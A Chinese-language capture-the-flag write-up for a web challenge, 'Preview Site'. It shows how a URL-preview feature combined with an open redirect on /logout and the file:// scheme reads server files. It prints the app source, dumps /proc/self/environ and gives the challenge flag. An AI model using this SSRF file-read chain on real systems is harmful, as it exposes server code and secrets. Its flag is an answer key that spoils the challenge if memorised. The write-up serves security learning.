#Web 

## 題目

**Preview Site**

請使用固定帳號登入，再使用網站預覽功能。
帳號：guest
密碼：guest

給了一個網址，點開來：
![[W4-9_web.png|398]]
---

用 `guest / guest` 登入後，按 `Send request`
![[W4-9_sendReq.png|376]]
---

## 解題
1. 經過一下午的嘗試 ~~（跟 GPT 吵架） （別問過程，反正解出來了）~~ 最後在 URL 的欄位輸入 `http://previewsite/logout?next=file:///app/main.py`，得到 result：
   ```python
	app = Flask(__name__)
	app.secret_key = os.urandom(24)
	users = {'guest': 'guest'}
	
	def send_request(url, follow=True):
	    try:
	        response =  urllib.request.urlopen(url)
	    except urllib.error.HTTPError as e:
	        response = e
	    redirect_url = response.geturl()
	    if redirect_url != url and follow:
	        return send_request(redirect_url, follow=False)
	    return response.read().decode('utf-8')
	
	@app.route('/login', methods=['GET', 'POST'])
	def login():
	    next_url = request.args.get('next', url_for('index'))
	    if request.method == 'POST':
	        username = request.form['username']
	        password = request.form['password']
	        if users.get(username) == password:
	            session['username'] = username
	            flash('login success')
	            return redirect(next_url)
	        else:
	            error = 'login failed'
	            return render_template('login.html', error=error, next=next_url)
	    return render_template('login.html', next=next_url)
	
	@app.route('/logout')
	def logout():
	    session.pop('username', None)
	    next_url = request.args.get('next', url_for('index'))
	    return redirect(next_url)
	
	@app.route('/fetch', methods=['GET', 'POST'])
	def fetch():
	    if 'username' not in session:
	        return redirect(url_for('login'))
	
	    if request.method == 'POST':
	        url = request.form.get('url')
	        if not url:
	            flash('Please provide a URL.')
	            return render_template('fetch.html')
	        try:
	            if not url.startswith(os.getenv("DOMAIN", "http://previewsite/")):
	                raise ValueError('badhacker')
	            resp = send_request(url)
	            return render_template('fetch.html', content=resp)
	        except Exception as e:
	            error = f'error：{e}'
	            return render_template('fetch.html', error=error)
	    return render_template('fetch.html')
	
	@app.route('/')
	def index():
	    username = session.get('username')
	    return render_template('index.html', username=username)
   ```
   -> <mark style="background: #FFF3A3A6;">經透過 SSRF + Open Redirect + `file://` 成功讀取伺服器上的 `/app/main.py`</mark>
2. 一樣的方法檢查環境變數
   ```
   http://previewsite/logout?next=file:///proc/self/environ
   ```
   得到結果
   ```
   HOSTNAME=692b5eb03c5bHOME=/root
   DOMAIN=http://previewsite/PYTHON
   UNBUFFERED=1
   GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
   PYTHON_SHA256=a0da1e72132e950154eca0f6f47d5db828454700de20e5113667940d81e0db04
   UWSGI_INI=/app/uwsgi.ini
   NGINX_MAX_UPLOAD=0
   UWSGI_PROCESSES=16
   PYTHONDONTWRITEBYTECODE=1
   STATIC_URL=/static
   UWSGI_CHEAPER=2
   PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   LANG=C.UTF-8PYTHON_VERSION=3.10.21
   NGINX_WORKER_PROCESSES=1
   LISTEN_PORT=80
   STATIC_INDEX=0
   PWD=/app
   STATIC_PATH=/app/static
   PYTHONPATH=/app
   SUPERVISOR_ENABLED=1
   SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
   SUPERVISOR_PROCESS_NAME=uwsgi
   SUPERVISOR_GROUP_NAME=uwsgi
   ```
   -> 沒有看到 FLAG，Flag 不在環境變數中
3. 嘗試 
   ```
	http://previewsite/logout?next=file:///flag
   ```
   ![[W4-9_flag.png|421]]
4. flag = `CTF{open_redirect_to_your_local_file_2893hrgiubf3wq1}`